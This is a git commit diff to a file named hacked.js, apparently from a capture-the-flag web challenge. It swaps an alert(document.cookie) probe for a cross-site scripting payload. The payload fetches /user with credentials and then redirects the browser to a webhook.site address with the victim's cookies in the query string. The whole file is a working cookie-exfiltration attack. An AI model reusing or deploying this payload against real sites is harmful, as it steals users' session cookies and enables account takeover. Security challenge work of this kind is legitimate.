47faeaa780f1e4504837f732bf84374ffd350ad0
Danh <87541691+darealDanh@users.noreply.github.com>
2025-09-08 16:27:56 +0700

    Update hacked.js

--- hacked.js
+++ hacked.js
@@ -1,1 +1,10 @@
-alert(document.cookie)
+<script>
+// XS-Leak payload to extract FLAG cookie
+fetch('/user', {credentials: 'include'})
+  .then(r => r.text())
+  .then(data => {
+    // Extract flag or send cookies to attacker server
+    window.location = 'https://webhook.site/5e2efd7a-d4ef-417c-860f-bbfc5551b28b/exfil?data=' + 
+                     encodeURIComponent(document.cookie);
+  });
+</script>
